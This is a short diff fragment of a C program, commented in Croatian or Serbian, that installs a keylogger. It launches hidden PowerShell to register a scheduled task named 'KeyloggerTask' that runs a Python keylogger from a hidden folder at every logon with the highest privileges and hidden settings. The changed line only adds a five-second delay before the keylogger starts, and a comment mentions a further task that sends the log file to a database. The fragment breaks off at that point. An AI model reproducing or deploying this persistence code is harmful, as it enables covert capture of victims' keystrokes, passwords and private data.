@@ -9,7 +9,7 @@ int main() {
                  "-Command \"if (Get-ScheduledTask -TaskName 'KeyloggerTask' -ErrorAction SilentlyContinue) { Write-Output 'Task vec postoji.' } else { $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -command pyw \"C:\\skriveni_folder\\Keylogger.pyw\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $principal = New-ScheduledTaskPrincipal -UserId (whoami) -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries:$true -DontStopIfGoingOnBatteries:$true; $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -Settings $settings; Register-ScheduledTask -TaskName 'KeyloggerTask' -InputObject $task }\"", 
                  NULL, SW_HIDE);
     
-	system("cmd /c pyw c:\\skriveni_folder\\Keylogger.pyw");
+	system("cmd /c timeout 5 & pyw c:\\skriveni_folder\\Keylogger.pyw");
                  
     //Kreiranje taska za slanje log filea u DB
 	ShellExecute(NULL, "open", "powershell.exe", 
